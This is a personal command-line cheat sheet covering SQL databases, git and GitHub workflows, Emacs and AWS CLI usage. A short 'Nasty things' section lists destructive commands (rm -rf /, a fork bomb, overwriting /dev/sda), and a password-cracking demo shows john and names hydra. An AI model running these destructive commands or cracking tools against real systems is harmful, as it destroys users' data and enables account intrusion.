mysql> source monday.sql                # run script
mysql> SELECT * FROM table \            # dump to CSV
       INTO OUTFILE '/Users/awdeorio/out.csv' \
       FIELDS TERMINATED BY ',' \
       LINES TERMINATED BY '\n'
mysql> CREATE DATABASE mydb;            # Create db
mysql> USE mydb;                        # Set default db

mysql> USE db                           # Default database for future commands
mysql> SHOW DATABASES                   # List databases
mysql> SHOW TABLES                      # List tables

# PostgreSQL Linux CLI
# https://www.postgresql.org/docs/current/static/app-psql.html
psql                                    # Start postgresql shell
psql -c QUERY                           # Execute QUERY
psql -f FILE.sql -v ON_ERROR_STOP=1     # Read commands from FILE.sql
psql -a [--echo-all]                    # Echo all input commands and queries
psql -U DB_USER -h DB_HOST -d DB_NAME   # connect using a TCP connection
sudo -u postgres psql                   # Start shell, Ubuntu
PGPASSWORD=${DB_PASSWORD} psql          # Specify password at CLI
psql -d DB                              # Specify database at CLI
psql -U USERNAME                        # Specify username at CLI
psql -h HOST                            # Specify host at CLI
createdb DB                             # Create database
psql> CREATE DATABASE db;               # Create database
dropdb --echo DB                        # Drop a database, verbose
psql -c 'SELECT usename FROM pg_user;'  # List users
createuser USER                         # Create user
createuser USER --createdb              # Create user with create DB permissions
createuser USER --superuser             # Create superuser
psql -c "ALTER ROLE user WITH PASSWORD 'password'"  # Change password
dropuser --echo USER                    # Remove a user, verbose
pg_dump DB -f FILE.sql                  # Dump database to file
pg_dump -t TABLE DB > FILE.sql          # Dump one table to file
psql -lqt                               # list databases
psql> \list                             # list databases
psql> \l                                # list databases
psql> \connect DB                       # connect to database
psql> \c URL                            # connect to database using URL
psql> \dt                               # list tables
psql> \d+ TABLE                         # display schema
psql> \du                               # list users
psql> \quit                             # exit psql CLI
psql> \q                                # exit psql CLI

# Postgres check if DB exists
SELECT 1 FROM pg_database WHERE datname='DB'
$ psql postgres -tAc "SELECT 1 AS result FROM pg_database WHERE datname='DB'"

# Postgres check if USER exists (do this on the 'postgres' DB)
psql> SELECT 1 FROM pg_roles WHERE rolname='USER'
$ psql postgres -tAc "SELECT 1 FROM pg_roles WHERE rolname='USER'"

# Postgres dump table to CSV, compressed and uncompressed
psql <<< "COPY table TO 'file.csv' DELIMITER ',' CSV HEADER;"
psql <<< "COPY table TO STDOUT DELIMITER ',' CSV HEADER;" | gzip -f >FILE.csv.gz
psql -c "COPY (<select query>) TO STDOUT WITH CSV"
sudo -H sudo -u postgres psql DB <<< "COPY () TO STDOUT DELIMITER ',' CSV HEADER;"

# Microsoft SQL Server (2005, 2008, 2012, 2014)
SELECT @@VERSION                        # Microsoft Server SQL version
SELECT TOP 10 * FROM table;             # return 10 results

# Show databases
SELECT name FROM master.dbo.sysdatabases # databases

# Show tables
SELECT * FROM information_schema.tables WHERE TABLE_TYPE='BASE TABLE' # tables

# Show tables from <DATABASE_NAME>
SELECT TABLE_NAME FROM <DATABASE_NAME>.INFORMATION_SCHEMA.Tables WHERE TABLE_TYPE = 'BASE TABLE'

# Show tables from <SCHEMA_NAME>
FIXME

SELECT * FROM <schema>.[<table>]        # handle table names with spaces

# MSSQL column names
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'myTable'

# Oracle SQL
SELECT * FROM table WHERE ROWNUM <= 10  # return 10 results

# Oracle SQL version
SELECT * FROM v$version

# Print column names
SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='<name>'

# Auto increment
PRIMARY KEY AUTO_INCREMENT              # MySQL
SERIAL PRIMARY KEY                      # PostgreSQL https://www.tutorialspoint.com/postgresql/postgresql_using_autoincrement.htm 
INTEGER PRIMARY KEY                     # SQLite, reuse rowids https://sqlite.org/autoinc.html
INTEGER PRIMARY KEY AUTOINCREMENT       # SQLite3, monotonically increasing

# SQL
TIMESTAMP DEFAULT CURRENT_TIMESTAMP     # avoid initializing timestamps
FOREIGN KEY (child_id)                  # add foreign key constraint to col
  REFERENCES parent_table(parent_id)    # connect to column in parent table
  ON UPDATE CASCADE                     # update child rows with parents row
  ON DELETE CASCADE                     # delete child rows with parents row
SELECT a.*, b.*                         # 2-way join AKA inner join
  FROM a JOIN b
  ON a.id=b.id;
SELECT a.*, b.*, c.*                    # 3-way join AKA inner join
  FROM (a JOIN b ON a.id=b.id)
  JOIN c ON (b.id=c.id);
SELECT                                  # Join same table twice
  students.email AS student,
  staff.email AS staff,
  FROM queue
  JOIN users AS students ON queue.student_id=students.id
  JOIN users AS staff ON queue.staff_id=staff.id
SELECT MAX(id) FROM table               # last auto-generated id from table
SELECT LAST_INSERT_ID()                 # last auto-generated id, globally
SELECT * FROM table ORDER BY x ASC;     # sort on x, ascending
SELECT * FROM table ORDER BY x DESC;    # sort on x, descending
SELECT * FROM table LIMIT 1;            # return one result
SELECT * FROM table ORDER BY x ASC LIMIT 1  # FIRST
SELECT * FROM table ORDER BY x DESC LIMIT 1 # LAST
CREATE DATABASE db;                     # create new database db
SHOW DATABASES;                         # list all databases
DROP DATABASE db;                       # delete database
SHOW CREATE TABLE table;                # print statement to create table
USE db;                                 # open database db
SHOW TABLES;                            # list tables in db
DROP TABLE table;                       # delete table
DROP TABLE table IF EXISTS table;       # delete table if it exists
INSERT INTO table (col, ...)            # add a row
  VALUES ('val', ...);                  # ...
UPDATE table SET col=val WHERE cond;    # update a row
DELETE FROM table WHERE column="value"; # remove one row
DELETE FROM table;                      # remove all rows in table
GROUP BY
PARTITION
RANK

# SQL Common Table Expressions
# Basically "named sub queries"
# https://blog.expensify.com/2015/09/25/the-simplest-sqlite-common-table-expression-tutorial/
WITH x AS (SELECT * FROM y)
SELECT * from y

# ODBC  https://github.com/mkleehammer/pyodbc/wiki
odbcinst -j                             # Show location of ini files
cat /etc/obdbcinst.ini                  # Driver .so locations
cat /etc/obdbc.ini                      # DSN description (shortcut, optional)
isql DB USERNAME PASSWORD               # unixODBC command line tool
iusql                                   # ^^^ with UTF8 support
isql -b <<< QUERY                       # Batch mode
isql -b -c -d, <<< QUERY                # Dump CSV


########################################
# git
#
# Lots of good examples https://github.com/k88hudson/git-flight-rules

# One-time setup for a user
git config --global user.name "Name"    # Your name for author when committing
git config --global user.email "email"  # email address (global)
git config user.email "email"           # email address for one project
git config --global color.diff auto     # colors: git diff
git config --global color.status auto   # colors: git status
git config --global color.branch auto   # colors: git branch
git config --global commit.gpgSign true # Sign commits by default
git config --global user.signingKey BB6201BA07530070  # which key to sign with

# One-time setup for a project
git clone ssh://USERNAME@SERVER/~/opt/git/PROJECT.git # server
git clone git@github.com:REPO/PROJECT.git             # github
git clone https://github.com/REPO/PROJECT.git         # github anonymous
git init DIR                                          # no server

# Linux line endings: .gitattributes
* text=auto eol=lf

# Push an existing repository to a remote
git remote add origin git@github.com:ORGANIZATION/PROJECT.git
git push -u origin master

# Basic workflow
git pull                                # update local copy
$EDITOR FILE                            # work on stuff, modify files
git add FILE                            # add file to commit
git status                              # see what's been added or modified
git commit                              # commit any added files
git push                                # push changes to server

# Repository setup on a server (without github)
ssh SERVER                              # alternative: use shared network volume
mkdir -p ~/opt/git/PROJECT.git          # make directory
git init --bare ~/opt/git/PROJECT.git   # intialize bare repository

# Repository setup on github
https://github.com -> "make a new repository"   # Create a new repository
https://help.github.com/articles/generating-ssh-keys/ # SSH keys
https://help.github.com/articles/remove-sensitive-data/ # remove sensitive data

# Update your local copy, merging from repository, manual
git fetch origin                        # fetch from origin
git fetch --prune                       # remove stale local branches
git fetch -vp                           # ^^^ + verbose
git branch                              # check your branch
git diff master origin/master           # see changes
git merge origin/master                 # this will be a FF if no local changes
git rebase origin/master                # 

# Forking work flow: Edit a branch on a fork using a remote named after USER
git remote add USER git@github.com:USER/REPO.git
git fetch USER
git switch BRANCH
git switch -c BRANCH-USER --track USER/BRANCH  # If branch has same name
git commit
git push
git push USER HEAD:BRANCH                      # If branch has same name
git remote remove USER                         # Clean up

# Forking work flow: Edit a branch on a fork using the gh tool
gh pr checkout NUM
git commit
git push git@github.com:USER/REPO.git

# Forking work flow: Edit a branch using a clone
# https://help.github.com/articles/committing-changes-to-a-pull-request-branch-created-from-a-fork/
git clone git@github.com:seshrs/mailmerge.git mailmerge-seshrs  # Clone seshrs's fork
git remote add upstream git@github.com:awdeorio/mailmerge.git
git fetch upstream
git switch BRANCH                       # Check out PR source branch
git merge upstream/develop              # Update BRANCH
git push                                # Push to seshrs's repo

# Merging a fork
git remote add USER git@github.com:USER/REPO.git # Add additional remote
git fetch OTHER_REPO                    # Get their changes
git switch develop                      # Checkout branch you want to merge into
git merge --no-ff OTHER_REPO/OTHER_BRANCH  # Merge their changes

# Commit
git branch                              # check your branch
git status                              # check file modifications
git add FILE                            # add file to commit
git commit                              # commit, with a message
git push                                # push the commit(s) to server

# Undo
git checkout FILE                       # revert FILE to last checked-in version
git restore FILE                        # revert FILE to last checked-in version
git reset PATH                          # undo git add
git reset --soft                        # changes to tracked files are discarded
git reset --soft HEAD~                  # discard one commit not pushed
git reset --hard origin/BRANCH          # discard all commits not pushed
git reset --hard                        # reset head to COM, files unchanged
git rm -r --cached PATH                 # undo git add, without removing files
git clean -fdx --dry-run                # restore to "clean repo", DELETES
git commit --amend                      # Combine this commit with previous
git rev-list -n 1 HEAD -- FILE          # 1. Commit of a deleted file
git checkout COMMIT^ -- FILE            # 2. Recover deleted file
git revert COMMIT                       # revert COMMIT
git checkout -f COMMIT -- .             # revert *to* COMMIT

# Sanity checks
git status                              # Current branch and dirty files
git config --global --list              # Name, email, etc.
git remote -v                           # Upstream config
git branch -vv                          # Branch to upstream config
git ls-files                            # Files under version control
git clean -xdn                          # Files not under version control
head .gitignore                         # .gigitignore exists
git fetch -vv                           # Connect to upstream server

# Temporarily stash work, restoring a clean set of files
git stash                               # stash current modifications on stack
git stash list                          # view stash stack
git stash pop                           # "unstash" top of stack

# Commit only part of a file
# https://stackoverflow.com/questions/1085162/commit-only-part-of-a-file-in-git
git add --patch FILE                    # stage part of a file for commit
git add -N                              # if file isn't in repo, do this first
git diff --staged                       # check that you staged correct changes
git reset -p                            # unstage mistakenly added hunks
git commit -v                           # view commit while you edit commit msg

# Ignore some files (don't version them)
echo '*~' > .gitignore                  # ignore emacs backup files
git add .gitignore                      # git should track ignore file itself
git commit                              # git should track ignore file itself
git config --global core.excludesfile ~/.gitignore_global  # global gitigore

# History
git rev-parse HEAD                      # print hash of current commit
git log                                 # commit history
git log FILE                            # commit history for one file
git log --stat                          # show insertions and deletions
git log --oneline                       # less info
git log --oneline --decorate --graph --all # more info
git log --graph --abbrev-commit --decorate --date=relative --format=format:'%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(bold blue)- %an%C(reset)%C(bold yellow)%d%C(reset)' --all
git reflog -10                          # See last 10 actions

# Identifying commits
git rev-parse --abbrev-ref HEAD         # Current branch
git describe --dirty                    # Repo is clean or dirty
git describe --match=NeVeRmAtCh --always --abbrev=8 --dirty # COMMIT[-dirty]
git log -1 --format='%H'                # Commit hash of current branch
git rev-parse HEAD                      # Commit hash of current branch
git rev-parse master                    # Commit hash of master
git rev-parse origin/master             # Commit hash of repo's master
git diff-index --quiet HEAD --          # Return non-zero if repo is dirty

# Versions of a file
git show REV:FILE                       # Old version of file
git show HEAD^ FILE                     # last committed version
git show HEAD~4:FILE                    # 4th last commit

# Remote repositories
git remote                              # list names of remote repositories
git remote show origin                  # more info
git remote set-url origin NEW_URL       # change location of repo
git branch -vv                          # branch remotes

# Branching
git branch                              # view current and local branches
git branch -a                           # view all branches
git branch --all -vv --sort=-committerdate # view branches by recent commit date
git branch -vv                          # include tracking and commit info
git branch --merged                     # show merged branches
git branch BRANCH                       # create a new branch
git switch BRANCH                       # switch to local BRANCH
git checkout --track origin/BRANCH      # switch to remote BRANCH
git switch --track origin/BRANCH        # switch to remote BRANCH
git checkout -b BRANCH                  # create a new branch and switch to it
git switch -c BRANCH                    # create a new branch and switch to it
git push origin BRANCH                  # push BRANCH to remote
git branch --set-upstream-to=origin/BRANCH BRANCH # fix tracking
git rev-parse --abbrev-ref HEAD         # name of current branch (scriptable)

# Rename a branch
git branch -m old_branch new_branch         # Rename branch locally
git push origin -d old_branch               # Delete the old branch
git push --set-upstream origin new_branch   # Push the new branch

# Rename master -> main
# https://github.com/github/renaming
git branch -m master main
git fetch origin
git branch -u origin/main main
git remote set-head origin -a

# Branching Model  http://nvie.com/posts/a-successful-git-branching-model/
git checkout -b feature/F develop       # start working on a new feature "F"
git add FILE                            # add files
git commit                              # commit to branch feature/F
git fetch                               # get changes to feature/F from repo
git rebase                              # apply changes from repo
git push origin feature/F               # push branch to remote
git switch develop                      # switch to develop branch
git merge --no-ff feature/F             # merge F into develop, keep branch info
git branch -d feature/F                 # delete F branch
git push origin develop                 # push to server
git push origin ":feature/F"            # remove F branch from server

# A successful Git branching model AKA Git Flow
#
# Good for explicitly versioned software, or if you need to support multiple
# versions in the wild
#
# https://nvie.com/posts/a-successful-git-branching-model/
# https://danielkummer.github.io/git-flow-cheatsheet/
brew install git-flow-avh               # Install
git flow init                           # Initialize inside a repository
git flow feature start NAME             # Start a new feature
git flow feature finish NAME            # Finish a feature
git flow feature publish NAME           # Publish a feature
git flow feature pull origin NAME       # Get feature published by another user
git flow feature track NAME             # Track a feature on origin
git flow release start RELEASE          # Start a release
git flow release publish RELEASE        # Publish a release
git flow release track RELEASE          # Track a release
git flow release finish RELEASE         # Finish a release
git push --tags                         # Push release tags
git flow hotfix start VERSION           # Start a hotfix
git flow hotfix finish VERSION          # Finish a hotfix

# GitHub Flow
#
# Good for continuously delivered software, not rolled back, and you don't have
# to support multiple versions in the wild.  Very simple.
#
# https://docs.github.com/en/get-started/quickstart/github-flow
# https://www.atlassian.com/git/tutorials/comparing-workflows/feature-branch-workflow

# Tagging
git tag                                 # list tags
git tag TAG                             # apply lightweight tag
git tag -a TAG                          # apply annotated tag
git tag -a TAG REV                      # apply annotated tag to REV commit
git tag --delete TAG                    # delete a local tag
git push --delete origin TAG            # delete a remote tag
git push --delete origin TAG            # git push origin :tagname
git push --tags                         # make tags public
git checkout tags/TAG                   # checkout a tag as detacted HEAD
git describe                            # describe commit using most recent tag
git describe --dirty                    # append "-dirty" if repo isn't clean
git describe --always                   # use commit object as fallback

# Comparing
git diff BRANCH1 BRANCH2                # diff two local branches
git diff master remotes/origin/dataset  # diff two remote branches
git diff --name-status ref1..ref2       # see what files changed
git diff --stats                        # summary of insertions and deletions
git mergetool --tool-help               # list available diff/merge tools
git config --global diff.tool TOOL      # use TOOL for merging
git config --global diff.tool --directory TOOL # use TOOL for dir merging, too
https://github.com/REPO/compare/HASH1...HASH2  # Visualize diff on GitHub
gitk --all                              # GUI history and diff
git ls-files                            # List files under version control

# Merging
git merge develop                       # merge develop into current branch
git cherry-pick 62ecb3                  # merge *one* commit into current branch
git cherry-pick A^..B                   # ^^^ commits A thru B, inclusive
git checkout --theirs PATH/FILE         # conflict: keep their file
git checkout --ours PATH/FILE           # conflict: keep my file
git commit                              # conflict: I'm done, finish merge

# Signing with GPG keys
gpg -K --keyid-format LONG              # list keys
git config --global user.signingkey KEY # set key
export GPG_TTY=$(tty)                   # connect to GPG
git tag -s TAG                          # create a signed tag
git tag -v TAG                          # verify signed tag
git commit -S                           # create a signed commit
git commit --amend -S                   # sign last commit
git verify-commit HEAD                  # verify signed commit

# Rebase automatically, resulting in a linear history like Subversion
# Ref: http://stevenharman.net/git-pull-with-automatic-rebase
git config branch.autosetuprebase always
git config branch.develop.rebase true
git config branch.autosetuprebase always

# Sub modules (a subdir that is another repo)
git clone --recursive                   # Clone a repo with submodules
git submodule update --init             # Use if you forgot --recursive

# Tarballs
git archive --format tar.gz HEAD > file.tar.gz
git archive --format tar.gz --prefix PREFIX/ --output FILE.tar.gz master

# Tracking large files with git-lfs
brew install git-lfs                    # install git-lfs step 1
git lfs install                         # install git-lfs step 2
git lfs track '*.psd'                   # start tracking .psd files
git lfs track                           # types of files managed by git-lfs
git add file.psd                        # (normal git flow)
git commit -m 'blah'                    # (normal git flow)
git push origin master                  # (normal git flow)
git lfs status                          # staged (uncommitted) changes
git lfs ls-files                        # files managed by git-lfs (committed)

# Avoid checking out all commits in repo with a long history
git clone --depth N                     # Clone with truncated history
git clone --depth N --no-single-branch  # ^^^ with N commits from every branch
git fetch --depth M                     # Deepen a shallow clone
git fetch --depth M                     # Reduce size of clone (if < M), git >= 2.14

# Remove git committed passwords, large files and other nuisances
# BFG Repo Cleaner https://rtyley.github.io/bfg-repo-cleaner/

# Visual practice with git
# https://learngitbranching.js.org/
git clone
git fakeTeamwork
git commit
git fetch
git rebase
git push

# Render GitHub-flavored Markdown (GFM)
# @seshrs tips: https://preview.sesh.rs/previews/eecs485staff/primer-spec/develop-preview/docs/MARKDOWN_TIPS.html
# Lexers https://github.com/rouge-ruby/rouge/tree/master/lib/rouge/lexers
# GFM pycon: console?lang=python,prompt=>>>,...
# Other options: https://github.com/rouge-ruby/rouge/blob/6bd36244940e7ae2b4642040ca6618dfb4847993/lib/rouge/lexers/console.rb#L12-L24
pip install grip                        # install grip utility
grip -b README.md                       # render README.md in browser
grip -b --norefresh README.md           # ^^^ limit github API usage

# GitHub CLI tool (gh)
gh browse                               # open home page of current repo
gh browse 217                           # open issue or PR 217
gh browse -s                            # open settings
gh issue list                           # show issues
gh issue list --web                     # ^^^ in browser
gh pr status                            # Summary PRs code review, etc.
gh pr list                              # show PRs
gh pr list --web
gh pr view                              # show PR in terminal
gh pr view --web                        # open PR in browser
gh pr create                            # create pull request from this branch
gh pr create \                          # ^^^ prefilled
  --title "lorum" \
  --body "ipsum" \
  --reviewer HANDLE
gh pr checkout 255                      # Checkout branch for PR 255
gh pr checks                            # Show CI status for this PR
gh run watch                            # Watch jobs (steps) complete
gh run view                             # Show jobs (steps)
gh run view --log                       # Show log
gh api repos/{user}/{repo}              # Authenticated GitHub API request

# Nasty things
rm -rf /                                # Delete everything
:(){ :|: & };:                          # Fork bomb (bash)
COMMAND > /dev/sda                      # Write directly to HDD
dd if=/dev/random of=/dev/sda           # Write junk to HDD
mv ~ /dev/null                          # Move home directory to nowhere

# Password cracking demo
openssl passwd -1 -salt xyz "password" > passwd.txt
john --show passwd.txt
$ cat ~/.john/john.pot
$1$xyz$cEUv8aN9ehjhMXG/kSFnM1:password

# Password cracking over a network
hydra

# Command line fun
cowthink                               # ascii art of a fow w/ thought bubble
cowsay STRING                          # ascii art of a cow w/ speech bubble
cowsay -f tux                          # ^^^ penguin
cowsay -l                              # list characters
fortune                                # print a random adage
fortune | cowsay                       # ascii art + random adage
sl                                     # steam locomotive
asciiquarium                           # ascii art animated aquarium
telnet towel.blinkenlights.nl          # ascii animated Start Wars C-] to quit
rig                                    # generate random fake identities
rev <<< "go hang a salami im a lasagna hog" # palindrome
figlet STRING                          # print ascii bubble text
lolcat                                 # rainbow colors (gem install lolcat)
curl http://wttr.in/ann_arbor          # ascii weather report
curl wttr.in/:help                     # ascii weather report help
curl wttr.in?0                         # ascii weather report, only current
curl wttr.in?n                         # ascii weather report, narrow width
curl parrot.live                       # dancing ASCII parrot

# Emacs
apt-get install emacs-nox              # Quick install on a Debian-based server
yum install emacs-nox                  # Quick install on a Redhat-based server
emacs -Q                               # No init files at all
emacs --batch -l ~/.emacs.d/init.el    # Process init file at the CLI
emacs --batch -l ~/.emacs.d/init.el \
  --funcall auto-package-update-now    # Update all packages
emacs --batch --funcall byte-recompile-directory  # Recompile all .el files
time emacs --batch -l ~/.emacs.d/init.el  # Measure Emacs load time

# Chrome
chrome://flags/#allow-insecure-localhost  # Allow homemade certs

# AWS CLI
# brew install awscli
aws configure                           # Initialize access key and secret key
aws --output text                       # Unix pipe friendly output
aws --output json                       # JSON output
aws ec2 describe-instances              # Show EC2 instances

# AWS S3 CLI
aws s3 ls                               # List buckets
aws s3 ls BUCKET                        # List BUCKET contents
aws s3 ls BUCKET/DIR                    # List BUCKET/DIR contents
aws s3 cp FILE BUCKET                   # Copy FILE to BUCKET
aws s3 cp DIR/ s3://BUCKET/ --recursive # Copy contents of DIR to BUCKET
aws s3 rm BUCKET/FILE                   # Remove FILE
aws s3 rm BUCKET/DIR --recursive        # Remove DIR

# AWS RDS CLI
aws rds describe-db-instances           # List database instances

# AWS ECR CLI
aws ecr describe-repositories           # List repos and get ARN
aws ecr describe-images --repository-name REPO  # List images in REPO
aws ecr list-images --repository-name insta485

# AWS ECS CLI
aws ecs create-cluster --cluster-name Insta485-Cluster  # Create
aws ecs list-clusters                       # List
aws ecs delete-cluster --cluster NAME       # Destroy
aws ecs register-task-definition --cli-input-json file://FILENAME  # Create
aws ecs list-task-definitions           # List
aws ecs deregister-task-definition --task-definition # Destroy

# AWS CloudWatch CLI
aws logs create-log-group --log-group-name insta485-log
aws logs describe-log-groups
aws logs delete-log-group --log-group-name NAME

# AWS ELB CLI: load balancer create, list, destroy
# https://aws.amazon.com/getting-started/hands-on/build-modern-app-fargate-lambda-dynamodb-python/module-two/
aws elbv2 create-load-balancer \
  --name insta485-nlb \
  --scheme internet-facing \
  --type network \
  --subnets REPLACE_ME_PUBLIC_SUBNET1 REPLACE_ME_PUBLIC_SUBNET2
aws elbv2 describe-load-balancer
aws elbv2 delete-load-balancer \
  --load-balancer-arn REPLACE_ME_ARN

# AWS ELB CLI: target group create, list, destroy
aws elbv2 create-target-group \
  --name Insta485-TargetGroup \
  --port 8000 \
  --protocol TCP \
  --target-type ip \
  --vpc-id $VPC_ID \
  --health-check-interval-seconds 10 \
  --health-check-path / \
  --health-check-protocol HTTP \
  --healthy-threshold-count 3 \
  --unhealthy-threshold-count
aws elbv2 describe-target-groups
aws elbv2 delete-target-group \
  --target-group-arn $ARN

# AWS ELB CLI: listener create, list, destroy
aws elbv2 create-listener \
  --default-actions TargetGroupArn=REPLACE_ME_NLB_TARGET_GROUP_ARN,Type=forward
  --load-balancer-arn REPLACE_ME_NLB_ARN \
  --port 80 \
  --protocol TCP
aws elbv2 describe-listeners \
  --load-balancer-arn $ARN

# AWS ELB CLI: service linked role create, list, destroy
aws iam create-service-linked-role
aws iam list-roles
aws iam delete-service-linked-role

# AWS ELB CLI: service create, list, destroy
aws ecs create-service \
  --cli-input-json file://insta485-service-definition.json
aws ecs list-services --cluster Insta485-Cluster
aws ecs describe-services \
  --cluster Insta485-Cluster \
  --services Insta485-Service

# AWS Elastic Beanstalk
# https://docs.aws.amazon.com/elasticbeanstalk/latest/dg/eb-cli3-getting-started.html
eb init -p python-3.6 insta485 --region us-east-2  # Create application
eb init                                 # Configure application
eb open                                 # Open application in browser
eb config                               # Modify configuration and push to AWS
eb deploy                               # Push source code changes to AWS
eb status                               # Check deployment status
eb events                               # Recent eb console messages
eb logs                                 # Recent web server lots
eb console                              # Open EB web console
eb terminate                            # Stop application
eb ssh                                  # SSH into web server
eb config save --cfg my-app-v1          # Save current env's current config
eb config put my-app-v1                 # Upload config after modification
eb restore                              # Rebuild a terminated environment
